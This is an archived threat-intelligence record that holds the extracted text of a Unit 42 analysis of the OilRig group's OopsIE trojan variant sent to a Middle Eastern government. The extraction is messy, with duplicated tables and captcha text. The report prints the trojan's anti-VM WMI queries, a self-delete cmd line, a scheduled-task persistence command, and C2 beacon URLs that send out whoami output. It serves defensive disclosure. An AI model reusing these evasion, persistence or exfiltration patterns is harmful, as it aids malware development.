{
    "id": "bf1a3893-4929-4af7-9fe3-87991e25e2ad",
    "created_at": "2022-10-25T16:48:12.682067Z",
    "updated_at": "2025-03-27T02:17:27.623359Z",
    "deleted_at": null,
    "sha1_hash": "a5209b418cad0bcc8212683bef7ee75db512b59b",
    "title": "OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE - Palo Alto Networks Blog",
    "authors": "",
    "file_creation_date": "2018-09-06T01:58:34Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 566023,
    "plain_text": "Security for... Products Services Resources Partners Company\n\n[Support](https://support.paloaltonetworks.com/support)\n\nEN\n\n[Blog Home > Unit 42 > OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE](https://www.paloaltonetworks.com/content/pan/en_US/cyberpedia.html)\n# OilRig Targets a Middle Eastern Government Get updates: Unit 42\n\nSign up to receive the latest news, cyber\n\n# and Adds Evasion Techniques to OopsIE\n\nthreat intelligence and research from\n\n\n[By Robert Falcone, Bryan Lee and Riley Porter](https://www.paloaltonetworks.com/content/pan/en_US/products/security-for/infrastructure/azure.html)\n\n[September 4, 2018 at 1:00 PM](https://www.paloaltonetworks.com/content/pan/en_US/services/support/end-of-life-announcements.html)\n\n[Category: Unit 42](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-network/next-generation-firewall/migration-tool.html) [Tags: evasion, Middle East, OilRig, OopsIE](https://researchcenter.paloaltonetworks.com/tag/evasion/)\n\n [3,356](https://www.paloaltonetworks.com/content/pan/en_US/products/globalprotect/subscription.html) (2) [](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F09%2Funit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie%2F) [](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F09%2Funit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie%2F&title=OilRig+Targets+a+Middle+Eastern+Government+and+Adds+Evasion+Techniques+to+OopsIE&summary=&source=)\n\n[The OilRig group maintains their persistent attacks against government entities in the Middle East](https://www.paloaltonetworks.com/content/pan/en_US/products/security-for/network/branch-remote.html)\n[region using previously identified tools and tactics. As observed in previous attack campaigns, the](https://www.paloaltonetworks.com/content/pan/en_US/products/security-for/network/network-perimeter.html)\n[tools used are not an exact duplicate of the previous attack and instead is an iterative variant. In this](mailto:techpartners@paloaltonetworks.com)\n[instance a spear phishing email was used containing a lure designed to socially engineer and entice the](https://www.paloaltonetworks.sg)\n[victim to executing a malicious attachment. The attachment was identified as a variant of the OopsIE](https://www.paloaltonetworks.com/content/pan/en_US/products/security-for/endpoints.html)\n[trojan we identified in February 2018. In this iteration of OopsIE, the general functionality largely](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-cloud/aperture-for-saas.html)\n[remained the same but contained the addition of anti-analysis and anti-virtual machine capabilities to](https://www.paloaltonetworks.co.uk)\n[further evade detection from automated defensive systems.](https://locator.paloaltonetworks.com/)\n\n\nUnit42\n\n\nBusiness Email\n\n\nBy submitting this form, you agree to our\n\n[Terms of Use and acknowledge our](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n[Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/privacy)\n\n\n-----\n\n[In July 2018, we reported on a wave of OilRig attacks delivering a tool called QUADAGENT involving](https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/)\n[a Middle Eastern government agency. During that wave, we also observed OilRig leveraging additional](https://www.paloaltonetworks.com/content/pan/en_US/products/security-for/compliance/gdpr.html)\n[compromised email accounts at the same government organization to send spear phishing emails](https://researchcenter.paloaltonetworks.com/government/)\n[delivering the OopsIE trojan as the payload instead of QUADAGENT. The OopsIE attack also targeted](https://researchcenter.paloaltonetworks.com/partners/)\n[a government agency within the same nation state, though a different organization than the one](https://researchcenter.paloaltonetworks.com/technical-documentation/)\n[targeted delivering QUADAGENT. The email subject was in Arabic, which translated to “Business](https://researchcenter.paloaltonetworks.com/unit42/)\ncontinuity management training”. The email was sent to an address belonging to a user group, rather\nthan a specific individual’s email address. Based on open source data collection, it appears the\ntargeted group had publicly published several documents regarding business continuity management\n[on the Internet, indicating the lures were purposefully crafted for this specific attack.](https://www.paloaltonetworks.com/content/pan/en_US/solutions/industries/education/education-higher.html)\n\n## Evasion Techniques\n\n[The OopsIE variant delivered in this attack begins its execution by performing a series of anti-VM and](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-network/subscriptions/minemeld.html)\n[sandbox checks. If any of the checks described in Table 1 are successful, the Trojan will exit without](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-network/subscriptions/url-filtering-pandb.html)\nrunning any of its functional code. These evasion techniques are meant to thwart automated analysis\nin an effort to avoid detection.\n\n\nreCAPTC\n\nPlease upgrade to a supported browser\nto get a reCAPTCHA challenge.\n\nAlternatively if you think you are getting\nthis page in error, please check your\ninternet connection and reload.\n\n|Technique|Description|\n|---|---|\n\n\nreCAPTC\n\nPlease upgrade to a supported browser\nto get a reCAPTCHA challenge.\n\nAlternatively if you think you are getting\nthis page in error, please check your\ninternet connection and reload.\n\nWhy is this happening to me?\n\n##### SUBMIT\n\n\n-----\n\n|Temperature Check|The Trojan will perform the following WMI query: SELECT * FROM MSAcpi_ThermalZoneTemperature The Trojan will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine.|\n|---|---|\n\n\nMouse Pointer\nCheck\n\n\nSelect * from Win32_Fan\n\n[According to MSDN, this query should return a class that provides statistics](https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-fan)\non the CPU fan. The Trojan checks to see if the result of this query returned\na class with more than 0 elements, which would most likely be true in a nonvirtual environment.\n\nThe Trojan will perform the following WMI query:\n\nSELECT * FROM MSAcpi_ThermalZoneTemperature\n\nThe Trojan will specifically attempt to get the CurrentTemperature value\nfrom this object and will check to see if the attempt results in an error that\ncontains the word supported. This is meant to find the result of Not\nsupported, which is the result if run in a virtual machine.\n\nThe Trojan will perform the following WMI query:\n\nSelect * from Win32_PointingDevice\n\nThe Trojan will check the Caption, Description, HardwareType, InfSection,\nManufacturer and Name fields in the results for the string VMware, Virtual,\nVBox, VM or Oracle.\n\n\n-----\n\nSelect * from Win32_DiskDrive\n\nThe Trojan will check the Caption and Model fields in the results for the\nstrings Virtual, VMWare, VM, VBox or Oracle.\n\n|Motherboard Check|The Trojan will perform the following WMI query: Select * from Win32_BaseBoard The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle.|\n|---|---|\n|Sandboxie DLL Check|The Trojan will attempt to load the SbieDll.dll module via LoadLibrary.|\n|VBox DLL Check|The Trojan checks to see if the file vboxmrxnp.dll exists in the system directory.|\n|VMware DLL Check|The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in the system directory.|\n\n\n-----\n\ng\n\nArabic Daylight Time (UTC+3)\n\nArab Daylight Time (UTC+3)\n\nArabian Daylight Time (UTC+4)\n\nMiddle East Daylight Time (UTC+2)\n\nIran Daylight Time (UTC+3.5)\n\nHuman Before executing its functional code, the Trojan presents a dialog box with\nInteraction the following line of code:\nCheck\n\nInteraction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3),\nMsgBoxStyle.Critical, null);\n\nThis dialog box displays An error occurred while processing user32.dll!,\nwhich the user must click the ok button for the Trojan to run its functional\ncode.\n\n_Table 1 List of anti-vm and anti-sandbox techniques used by OopsIE_\n\nMost of these evasion techniques have been observed in other malware families; however, a few of\nthe techniques were more novel. First, we had not seen the CPU fan check used before, and upon\ntesting the WMI query in a VMware Windows 7 virtual machine we saw no result, as seen in Figure 1\n\n|Human Interaction Check|Before executing its functional code, the Trojan presents a dialog box with the following line of code: Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null); This dialog box displays An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code.|\n|---|---|\n\n\n-----\n\n_Figure 1 WMI query for the Win32_Fan class on a VM returning no statistics_\n\nHowever, when we ran the same query in a physical system running Windows 7, we saw the contents\nof the Win32_Fan class, as seen in Figure 2. The OopsIE payload checks to see if the result of this\nquery as more than 0 elements to determine if it is running on a virtual machine.\n\n_Figure 2 WMI query for Win32_Fan run on a physical system showing statistics_\n\n\n-----\n\nbecause they did not support the WMI query. This suggests that other WMI-based VM detection\ntechniques may also detect certain physical systems if those systems do not support the specific WMI\nquery.\n\nThe last technique that was particularly interesting is the time zone check, as the Trojan will not\nexecute its functional code if the system does not have a specific time zone set. The Trojan compares\nthe TimeZone.CurrentTimeZone.DaylightName property to strings Iran, Arab, Arabia and Middle East,\nwhich will match the following time zones in Windows:\n\nArabic Daylight Time (UTC+3)\n\nArab Daylight Time (UTC+3)\n\nArabian Daylight Time (UTC+4)\n\nMiddle East Daylight Time (UTC+2)\n\nIran Daylight Time (UTC+3.5)\n\n[According to MSDN, these five time zones encompass 10 countries that fall within UTC+2, +3, +3.5 or](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-time-zones)\n+4 as seen in Figure 3. The fact that the Trojan will not operate on systems that are not configured\nwith these time zones suggests that this is a highly targeted attack focused on a specific subset of\ntarget nations.\n\n\n-----\n\n_Figure 3 Countries in which OopsIE will run in based on the time zone_\n\n## Notable Differences\n\nThe OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE\n[variant discussed in our previous blog. The main similarities include the use of a scheduled task to](https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/)\npersistently execute on the system, as well as the same general process to communicate with its C2\nserver. For instance, this Trojan uses the InternetExplorer application object much like the previous\nOopsIE Trojan and a very similar sequence of requests to obtain commands. Also, this version of the\nTrojan inspects HTTP responses from the C2 server for the tags <pre> and </pre> and will parse that\ndata for commands\n\n\n-----\n\ntreating each split value as an integer, subtracting one from each integer and converting each into a\ncharacter. The following code snippet was used to decode strings within OopsIE:\n\n\n1\n2\n3\n\n\nout = \"\"\nfor e in obfuscated_string.split(\"-\"):\nout += chr(int(e)-1)\n\n\nWhen first run, this OopsIE variant runs a variety of checks to avoid running in an analysis\nenvironment, as discussed in the previous section. The last check requires the user to click the ‘Ok’\nbutton in an error dialog box, as seen in Figure 4.\n\n_Figure 4 Error dialog box displayed by OopsIE_\n\nAfter displaying the error dialog box, the Trojan will sleep for two seconds by running the following\ncommand that runs the choice application. The use of the choice command, as seen below, did not\nappear in previous versions of OopsIE and appears to have been added in the most recent version used\nin this attack.\n\ncmd.exe /C choice /C Y /N /D Y /T 2 & Del\n\n\n-----\n\nWith the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make\nsure it runs persistently. The Trojan accesses two resources, named Sch and VBS that contains\nobfuscated strings that contain the command to create the scheduled task and the VBScript to run.\nThe decoded string from the Sch resource is:\n\nSchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f\n\nThe decoded string from the VBS resource is:\n\nCreateObject(“WScript.Shell”).Run(“%app%”)\n\nThe %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin. This\ndiffers from the previous OopsIE variant that used a hardcoded task name for the scheduled task. The\n%path% string in the scheduled task command will be replaced with the path to the following:\n\n%APPDATA%\\Windows\\ShwDoc.VBS\n\nThe decoded string from the VBS resource is written to ShwDoc.VBS. The %app% string in the\nVBScript is replaced with %APPDATA%\\Windows\\WindowsImplantment.exe. This process ultimately\nattempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled\ntask as it does not include a main loop to continue its execution.\n\nAfter creating this scheduled task for persistence, the Trojan will begin communicating with its C2\nserver. The process in which the Trojan communicates with its C2 server is very similar to the previous\nOopsIE Trojan that we discussed in our previous blog. This particular sample uses the following\ndomain as its C2 server:\n\nwww.windowspatch[.]com\n\nOne obvious difference between this version of OopsIE compared to the previously analyzed version\nis the strings in the C2 URLs are reversed, from chk to khc, what to tahw and resp to pser. Also, the\noops string used to signify and erroneous transmission from the C2, which gave OopsIE its name is\nreversed to spoo. Also, this variant of OopsIE uses the output of the whoami command as the\nparameter within the URL when communicating with the C2 server which differs from the previous\n\n\n-----\n\nhxxp://www.windowspatch[.]com/khc?<hex(STDOUT of whoami command)>\n\nIf the C2 server wishes to send a command, it will respond to the beacon above by echoing the\nwhoami command results sent by the Trojan to the C2 in the URL. If the Trojan receives this echo, it\nwill create the following file that the Trojan uses as a signal that it was able to successfully\ncommunicate with its C2 server:\n\n%APPDATA%\\Windows\\ShwDoc.srv\n\nIf the Trojan determines the C2 server wishes to send a command, it sends an HTTP request to the\nfollowing URL:\n\nhxxp://www.windowspatch[.]com/tahw?<hex(STDOUT of whoami command)>\n\nThe Trojan will first check the response to this request for the string spoo, which signifies the C2 does\nnot wish to issue a command. Otherwise, the Trojan will attempt to parse the response for a\ncommand, specifically by splitting the decode response on <> and treating the text to the left of the\n<> string as the command the text to the right as the command arguments. The command handler in\nthis OopsIE variant is very similar to the previous version, as it contains the same three (1, 2 and 3)\ncommands seen in Table 2. The one difference in this command handler from the previous version is\nthe boom! command, which allows the actor to uninstall the OopsIE Trojan from the system.\n\n**Command** **Description**\n\n1 Runs a supplied command and writes it output to\n%APPDATA%\\SchWin.vbs, which will then be uploaded to the C2 server.\n\n2 Downloads a file to the system. Splits argument on “(|)”, with the string to\nthe left representing the filename to save and the string to the right\nrepresenting the data to write to the file.\n\n3 Read specified file and uploads its contents to the C2 server.\n\nboom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the\nscheduled task whose name a GUID stored in the GID.bin file.\n\n|Command|Description|\n|---|---|\n|1|Runs a supplied command and writes it output to %APPDATA%\\SchWin.vbs, which will then be uploaded to the C2 server.|\n|2|Downloads a file to the system. Splits argument on “(|)”, with the string to the left representing the filename to save and the string to the right representing the data to write to the file.|\n|3|Read specified file and uploads its contents to the C2 server.|\n\n\n-----\n\nhttp://www.windowspatch.com/pser?<hex(STDOUT of whoami command)\n\n(BBZ|BBY)hex(up to 1000 bytes of hexadecimal data)>\n\n## Conclusion\n\nThe OilRig group remains a persistent adversary in the Middle East region. They continue to iterate\nand add capabilities to their tools while still functionally using the same tactics over and over again.\nWithin the time frame we have been tracking the OilRig group, they have repeatedly shown a\nwillingness to add less commonly found functionality to their tools, such as their heavy use of DNS\ntunneling in their backdoors or adding authentication to their webshells. This attack is no different,\nnow adding anti-analysis capabilities into their tools. This adversary is highly resourceful and\ncontinues to adapt over time. However, the tactics they continue to deploy are generally\nunsophisticated, and simple security hygiene would help organizations protect themselves against this\nthreat.\n\nPalo Alto Networks customers are protected from this OilRig attack campaign and OopsIE by:\n\n[AutoFocus customers can track this Trojan with the OopsIE tag](https://autofocus.paloaltonetworks.com/#/tag/Unit42.OopsIE)\nAll known OopsIE samples are marked with malicious verdicts in WildFire\nAll known OopsIE C2 domains have DNS signatures and are classified as Command and Control\n\n## Indicators of Compromise\n\n**OopsIE Trojan**\n\n36e66597a3ff808acf9b3ed9bc93a33a027678b1e262707682a2fd1de7731e23\n\n055b7607848777634b2b17a5c51da7949829ff88084c3cb30bcb3e58aae5d8e9\n\n6b240178eedba4ebc9f1c8b56bac02676ce896e609577f4fb64fa977d67c0761\n\n\n-----\n\ndefender-update[.]com\n\nwindowspatch[.]com\n\n##### Got something to say?\n\n\nLeave a comment...\n\n\n**Notify me of followup comments via e-mail**\n\n\nName (required)\n\n\nEmail (required)\n\n\nWebsite\n\n\nSUBMIT\n\n\n-----\n\nCOMPANY\n\n[Company](https://www.paloaltonetworks.com/company)\n\n[Careers](http://jobs.jobvite.com/paloaltonetworks/)\n\n[Sitemap](https://www.paloaltonetworks.com/sitemap)\n\n[Report a Vunerability](https://www.paloaltonetworks.com/security-disclosure)\n\n\nLEGAL NOTICES\n\n[Privacy](https://www.paloaltonetworks.com/legal-notices/privacy)\n\n[Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n[Documents](https://www.paloaltonetworks.com/legal-notices)\n\n[GDPR Readiness](https://www.paloaltonetworks.com/legal-notices/gdpr)\n\n\nACCOUNT\n\n[Manage a Subscription](https://www.paloaltonetworks.com/company/subscriptions)\n\n\n© 2018 Palo Alto Networks, Inc. All rights reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.09.04.OilRig_Targets_Middle_Eastern/oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie.pdf"
    ],
    "report_names": [
        "oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie"
    ],
    "threat_actors": [
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1536199114,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/a5209b418cad0bcc8212683bef7ee75db512b59b.pdf",
        "text": "https://archive.orkl.eu/a5209b418cad0bcc8212683bef7ee75db512b59b.txt",
        "img": "https://archive.orkl.eu/a5209b418cad0bcc8212683bef7ee75db512b59b.jpg"
    }
}